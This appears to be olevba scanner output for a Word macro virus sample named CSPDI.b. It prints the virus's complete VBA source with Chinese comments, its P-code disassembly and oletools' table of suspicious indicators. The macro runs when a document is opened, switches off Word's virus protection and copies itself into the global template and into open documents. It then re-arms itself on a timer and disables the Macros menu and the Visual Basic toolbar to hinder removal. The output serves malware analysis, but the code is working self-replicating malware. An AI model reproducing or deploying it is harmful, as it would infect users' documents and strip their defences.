olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.CSPDI.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.CSPDI.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: ./Virus.MSWord.CSPDI.b - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit

Public Sub MAIN()

Dim MyFile$
Dim OkExist
Dim TemplateName$
Dim internal
Dim xItem
Dim t
Dim s

'设置错误陷阱
On Error Resume Next

'获取活动文件名
If ActiveDocument.Path = "" Then
  MyFile$ = ActiveDocument.Name
Else
  MyFile$ = ActiveDocument.Path + "\" + ActiveDocument.Name
End If

If MyFile$ = "" Then GoTo Bye

'整点出现日期时间信息
t = Format(Time, "hhmmss")
If Mid(t, 3, 2) = "00" And Not (Format(Date, "yyyy") = "1998" And Val(Format(Date, "mm")) < 9) Then
  MsgBox s, vbSystemModal, "CPSDI"
  'MsgBox Format(Date, "dddd,yyyy mmm dd") + "日 " + Format(Time, "hh") + "时", vbSystemModal, "我的提醒"
End If


' 在通用模板中查找是否有AutoOpen宏
OkExist = 0
For Each xItem In NormalTemplate.VBProject.VBComponents
  If xItem.Type = 1 And xItem.Name = "AutoOpen" Then
    OkExist = 1
    Exit For
  End If
Next xItem

' 获取通用模板的文件名
TemplateName$ = NormalTemplate.Path + "\" + NormalTemplate.Name

'设置通用模板的文件属性为档案并解除其病毒防护功能
SetAttr TemplateName$, vbNormal
Options.VirusProtection = False

' 拷贝AutoOpen宏到通用模板
If OkExist <> 1 Then
    Application.OrganizerCopy Source:=MyFile$, Destination:=TemplateName$, Name:="AutoOpen", Object:=wdOrganizerObjectProjectItems
End If

' 在活动文档中查找是否有AutoOpen宏
OkExist = 0
For Each xItem In ActiveDocument.VBProject.VBComponents
  If xItem.Type = 1 And xItem.Name = "AutoOpen" Then
    OkExist = 1
    Exit For
  End If
Next xItem

'拷贝AutoOpen宏到活动文档
If OkExist <> 1 Then
    Application.OrganizerCopy Source:=TemplateName$, Destination:=MyFile$, Name:="AutoOpen", Object:=wdOrganizerObjectProjectItems
End If

Bye:

' 设置自动运行AutoOpen宏的计时器
internal = "00:" + Str(10 - Val(Mid(t, 4, 1)))
Application.OnTime When:=Now + TimeValue(internal) - TimeValue("00:00:" + Right(t, 2)), Name:="AutoOpen", Tolerance:=60
DisableMacroMenu
DisableVBTools
End Sub
Public Sub DisableMacroMenu()
'使工具菜单中的宏命令组失去作用
Dim cb, xItem, xxItem, xxxItem
For Each cb In ActiveDocument.CommandBars
  If cb.Name = "Menu Bar" Then
    For Each xItem In cb.Controls
      If xItem.Caption = "工具(&T)" Then
        For Each xxItem In xItem.Controls
          If xxItem.Caption = "宏(&M)" Then
            'xxItem.Enabled = True
            For Each xxxItem In xxItem.Controls
                xxxItem.Enabled = False
            Next xxxItem
            Exit Sub
          End If
        Next xxItem
      End If
    Next xItem
  End If
Next cb
End Sub
Public Sub DisableVBTools()
'使工具栏中的Visual Basic失去作用
Dim cb
For Each cb In ActiveDocument.CommandBars
  If cb.Name = "Visual Basic" Then
     cb.Enabled = False
     Exit For
  End If
Next cb
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.CSPDI.b
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/AutoOpen - 10049 bytes
' Line #0:
' 	Option  (Explicit)
' Line #1:
' Line #2:
' 	FuncDefn (Public Sub MAIN())
' Line #3:
' Line #4:
' 	Dim 
' 	VarDefn MyFile
' Line #5:
' 	Dim 
' 	VarDefn OkExist
' Line #6:
' 	Dim 
' 	VarDefn TemplateName
' Line #7:
' 	Dim 
' 	VarDefn internal
' Line #8:
' 	Dim 
' 	VarDefn xItem
' Line #9:
' 	Dim 
' 	VarDefn t
' Line #10:
' 	Dim 
' 	VarDefn s
' Line #11:
' Line #12:
' 	QuoteRem 0x0000 0x000C "设置错误陷阱"
' Line #13:
' 	OnError (Resume Next) 
' Line #14:
' Line #15:
' 	QuoteRem 0x0000 0x000E "获取活动文件名"
' Line #16:
' 	Ld ActiveDocument 
' 	MemLd Path 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #17:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	St MyFile$ 
' Line #18:
' 	ElseBlock 
' Line #19:
' 	Ld ActiveDocument 
' 	MemLd Path 
' 	LitStr 0x0001 "\"
' 	Add 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	Add 
' 	St MyFile$ 
' Line #20:
' 	EndIfBlock 
' Line #21:
' Line #22:
' 	Ld MyFile$ 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo Bye 
' 	EndIf 
' Line #23:
' Line #24:
' 	QuoteRem 0x0000 0x0014 "整点出现日期时间信息"
' Line #25:
' 	Ld Time 
' 	LitStr 0x0006 "hhmmss"
' 	ArgsLd Format$ 0x0002 
' 	St t 
' Line #26:
' 	Ld t 
' 	LitDI2 0x0003 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0002 "00"
' 	Eq 
' 	Ld Date 
' 	LitStr 0x0004 "yyyy"
' 	ArgsLd Format$ 0x0002 
' 	LitStr 0x0004 "1998"
' 	Eq 
' 	Ld Date 
' 	LitStr 0x0002 "mm"
' 	ArgsLd Format$ 0x0002 
' 	ArgsLd Val 0x0001 
' 	LitDI2 0x0009 
' 	Lt 
' 	And 
' 	Paren 
' 	Not 
' 	And 
' 	IfBlock 
' Line #27:
' 	Ld s 
' 	Ld vbSystemModal 
' 	LitStr 0x0005 "CPSDI"
' 	ArgsCall MsgBox 0x0003 
' Line #28:
' 	QuoteRem 0x0002 0x0066 "MsgBox Format(Date, "dddd,yyyy mmm dd") + "日 " + Format(Time, "hh") + "时", vbSystemModal, "我的提醒""
' Line #29:
' 	EndIfBlock 
' Line #30:
' Line #31:
' Line #32:
' 	QuoteRem 0x0000 0x0021 " 在通用模板中查找是否有AutoOpen宏"
' Line #33:
' 	LitDI2 0x0000 
' 	St OkExist 
' Line #34:
' 	StartForVariable 
' 	Ld xItem 
' 	EndForVariable 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #35:
' 	Ld xItem 
' 	MemLd TypeOf 
' 	LitDI2 0x0001 
' 	Eq 
' 	Ld xItem 
' 	MemLd New 
' 	LitStr 0x0008 "AutoOpen"
' 	Eq 
' 	And 
' 	IfBlock 
' Line #36:
' 	LitDI2 0x0001 
' 	St OkExist 
' Line #37:
' 	ExitFor 
' Line #38:
' 	EndIfBlock 
' Line #39:
' 	StartForVariable 
' 	Ld xItem 
' 	EndForVariable 
' 	NextVar 
' Line #40:
' Line #41:
' 	QuoteRem 0x0000 0x0015 " 获取通用模板的文件名"
' Line #42:
' 	Ld NormalTemplate 
' 	MemLd Path 
' 	LitStr 0x0001 "\"
' 	Add 
' 	Ld NormalTemplate 
' 	MemLd New 
' 	Add 
' 	St TemplateName$ 
' Line #43:
' Line #44:
' 	QuoteRem 0x0000 0x0030 "设置通用模板的文件属性为档案并解除其病毒防护功能"
' Line #45:
' 	Ld TemplateName$ 
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' Line #46:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #47:
' Line #48:
' 	QuoteRem 0x0000 0x0019 " 拷贝AutoOpen宏到通用模板"
' Line #49:
' 	Ld OkExist 
' 	LitDI2 0x0001 
' 	Ne 
' 	IfBlock 
' Line #50:
' 	Ld MyFile$ 
' 	ParamNamed Source 
' 	Ld TemplateName$ 
' 	ParamNamed Destination 
' 	LitStr 0x0008 "AutoOpen"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #51:
' 	EndIfBlock 
' Line #52:
' Line #53:
' 	QuoteRem 0x0000 0x0021 " 在活动文档中查找是否有AutoOpen宏"
' Line #54:
' 	LitDI2 0x0000 
' 	St OkExist 
' Line #55:
' 	StartForVariable 
' 	Ld xItem 
' 	EndForVariable 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #56:
' 	Ld xItem 
' 	MemLd TypeOf 
' 	LitDI2 0x0001 
' 	Eq 
' 	Ld xItem 
' 	MemLd New 
' 	LitStr 0x0008 "AutoOpen"
' 	Eq 
' 	And 
' 	IfBlock 
' Line #57:
' 	LitDI2 0x0001 
' 	St OkExist 
' Line #58:
' 	ExitFor 
' Line #59:
' 	EndIfBlock 
' Line #60:
' 	StartForVariable 
' 	Ld xItem 
' 	EndForVariable 
' 	NextVar 
' Line #61:
' Line #62:
' 	QuoteRem 0x0000 0x0018 "拷贝AutoOpen宏到活动文档"
' Line #63:
' 	Ld OkExist 
' 	LitDI2 0x0001 
' 	Ne 
' 	IfBlock 
' Line #64:
' 	Ld TemplateName$ 
' 	ParamNamed Source 
' 	Ld MyFile$ 
' 	ParamNamed Destination 
' 	LitStr 0x0008 "AutoOpen"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #65:
' 	EndIfBlock 
' Line #66:
' Line #67:
' 	Label Bye 
' Line #68:
' Line #69:
' 	QuoteRem 0x0000 0x001F " 设置自动运行AutoOpen宏的计时器"
' Line #70:
' 	LitStr 0x0003 "00:"
' 	LitDI2 0x000A 
' 	Ld t 
' 	LitDI2 0x0004 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Val 0x0001 
' 	Sub 
' 	ArgsLd Str 0x0001 
' 	Add 
' 	St internal 
' Line #71:
' 	Ld Now 
' 	Ld internal 
' 	ArgsLd TimeValue 0x0001 
' 	Add 
' 	LitStr 0x0006 "00:00:"
' 	Ld t 
' 	LitDI2 0x0002 
' 	ArgsLd Right 0x0002 
' 	Add 
' 	ArgsLd TimeValue 0x0001 
' 	Sub 
' 	ParamNamed When 
' 	LitStr 0x0008 "AutoOpen"
' 	ParamNamed New 
' 	LitDI2 0x003C 
' 	ParamNamed Tolerance 
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0003 
' Line #72:
' 	ArgsCall DisableMacroMenu 0x0000 
' Line #73:
' 	ArgsCall DisableVBTools 0x0000 
' Line #74:
' 	EndSub 
' Line #75:
' 	FuncDefn (Public Sub DisableMacroMenu())
' Line #76:
' 	QuoteRem 0x0000 0x001E "使工具菜单中的宏命令组失去作用"
' Line #77:
' 	Dim 
' 	VarDefn cb
' 	VarDefn xItem
' 	VarDefn xxItem
' 	VarDefn xxxItem
' Line #78:
' 	StartForVariable 
' 	Ld cb 
' 	EndForVariable 
' 	Ld ActiveDocument 
' 	MemLd CommandBars 
' 	ForEach 
' Line #79:
' 	Ld cb 
' 	MemLd New 
' 	LitStr 0x0008 "Menu Bar"
' 	Eq 
' 	IfBlock 
' Line #80:
' 	StartForVariable 
' 	Ld xItem 
' 	EndForVariable 
' 	Ld cb 
' 	MemLd Controls 
' 	ForEach 
' Line #81:
' 	Ld xItem 
' 	MemLd Caption 
' 	LitStr 0x0008 "工具(&T)"
' 	Eq 
' 	IfBlock 
' Line #82:
' 	StartForVariable 
' 	Ld xxItem 
' 	EndForVariable 
' 	Ld xItem 
' 	MemLd Controls 
' 	ForEach 
' Line #83:
' 	Ld xxItem 
' 	MemLd Caption 
' 	LitStr 0x0006 "宏(&M)"
' 	Eq 
' 	IfBlock 
' Line #84:
' 	QuoteRem 0x000C 0x0015 "xxItem.Enabled = True"
' Line #85:
' 	StartForVariable 
' 	Ld xxxItem 
' 	EndForVariable 
' 	Ld xxItem 
' 	MemLd Controls 
' 	ForEach 
' Line #86:
' 	LitVarSpecial (False)
' 	Ld xxxItem 
' 	MemSt Enabled 
' Line #87:
' 	StartForVariable 
' 	Ld xxxItem 
' 	EndForVariable 
' 	NextVar 
' Line #88:
' 	ExitSub 
' Line #89:
' 	EndIfBlock 
' Line #90:
' 	StartForVariable 
' 	Ld xxItem 
' 	EndForVariable 
' 	NextVar 
' Line #91:
' 	EndIfBlock 
' Line #92:
' 	StartForVariable 
' 	Ld xItem 
' 	EndForVariable 
' 	NextVar 
' Line #93:
' 	EndIfBlock 
' Line #94:
' 	StartForVariable 
' 	Ld cb 
' 	EndForVariable 
' 	NextVar 
' Line #95:
' 	EndSub 
' Line #96:
' 	FuncDefn (Public Sub DisableVBTools())
' Line #97:
' 	QuoteRem 0x0000 0x0020 "使工具栏中的Visual Basic失去作用"
' Line #98:
' 	Dim 
' 	VarDefn cb
' Line #99:
' 	StartForVariable 
' 	Ld cb 
' 	EndForVariable 
' 	Ld ActiveDocument 
' 	MemLd CommandBars 
' 	ForEach 
' Line #100:
' 	Ld cb 
' 	MemLd New 
' 	LitStr 0x000C "Visual Basic"
' 	Eq 
' 	IfBlock 
' Line #101:
' 	LitVarSpecial (False)
' 	Ld cb 
' 	MemSt Enabled 
' Line #102:
' 	ExitFor 
' Line #103:
' 	EndIfBlock 
' Line #104:
' 	StartForVariable 
' 	Ld cb 
' 	EndForVariable 
' 	NextVar 
' Line #105:
' 	EndSub 
' Line #106:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

